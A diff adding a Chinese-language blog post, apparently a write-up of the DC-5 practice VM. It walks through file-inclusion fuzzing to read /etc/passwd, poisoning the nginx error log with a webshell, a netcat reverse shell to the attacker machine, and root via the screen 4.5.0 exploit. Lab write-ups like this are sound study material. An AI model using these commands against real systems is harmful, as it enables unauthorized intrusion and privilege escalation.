@@ -147,6 +147,121 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/08/DC-5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="菜花">
+      <meta itemprop="description" content="让学习成为美好体验">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="热烈的爆炒菜花">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/06/08/DC-5/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-06-08 16:56:19 / 修改时间：16:54:33" itemprop="dateCreated datePublished" datetime="2023-06-08T16:56:19+08:00">2023-06-08</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><p>查看kali的ip地址：</p>
+<p>ifconfig</p>
+<p>kali的ip地址：192.168.1.217</p>
+<p>使用nmap扫描网段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap IP地址</span><br></pre></td></tr></table></figure>
+
+<p>DC-5的IP地址：192.168.1.221</p>
+<p><img src="C:\Users\Sakura\AppData\Roaming\Typora\typora-user-images\image-20230608164431234.png" alt="image-20230608164431234"></p>
+<p>访问contact中点击submit</p>
+<p>发现日期总会变化但是没有规律</p>
+<p>扫描后台目录发现有footer.php很可疑 访问之后</p>
+<p><img src="C:\Users\Sakura\AppData\Roaming\Typora\typora-user-images\image-20230607141029754.png" alt="image-20230607141029754"></p>
+<p>发现和thank.php中的一部分很相似，可能存在文件包含</p>
+<p>使用wfuzz去爆破他的参数名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt http://192.168.1.221/thankyou.php?FUZZ=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Sakura\AppData\Roaming\Typora\typora-user-images\image-20230608164659971.png" alt="image-20230608164659971"></p>
+<p>测试漏洞，尝试包含faq.php页面，发现确实存在本地文件包含漏洞。</p>
+<p><img src="C:\Users\Sakura\AppData\Roaming\Typora\typora-user-images\image-20230608164827644.png" alt="image-20230608164827644"></p>
+<p>执行的内容会被日志记录下来，通过whatweb查看到了是nginx1.6.2版本的</p>
+<p><img src="C:\Users\Sakura\AppData\Roaming\Typora\typora-user-images\image-20230608165316739.png" alt="image-20230608165316739"></p>
+<p>它的日志会记录在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p>
+<p><img src="C:\Users\Sakura\AppData\Roaming\Typora\typora-user-images\image-20230608084633752.png" alt="image-20230608084633752"></p>
+<p>使用bp对网站的日志进行写马操作</p>
+<p>不能直接在url上面写，因为会被解析</p>
+<p>写马之后会发现我们能在日志中看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.221/thankyou.php?file=/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>
+
+<p>看到我们上传的一句话木马</p>
+<p>然后用蚁剑连接</p>
+<p>进行反弹shell</p>
+<p>kali开启监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc kali的ip 5555 -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Sakura\AppData\Roaming\Typora\typora-user-images\image-20230608163358163.png" alt="image-20230608163358163"></p>
+<p>使用交互式终端的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>提权操作</p>
+<p>查找有suid权限的命令，发现screen-4.5.0比较可疑</p>
+<p>在kali的漏洞库搜索</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
+
+<p>复制到桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh</span><br></pre></td></tr></table></figure>
+
+<p>按照提示分别写到三个文件中，把除了dc5.sh再进行编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>
+
+<p>注意：第三段 <code>dc5.sh </code> 保存前需输入<code>:set ff=unix</code></p>
+<p>使用蚁剑上传把编译后的文件以及dc5.sh到DC-5的tmp目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">chmod +x dc5.sh</span><br><span class="line">ls -l</span><br><span class="line">./dc5.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后提权成功</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/11/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -796,7 +911,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
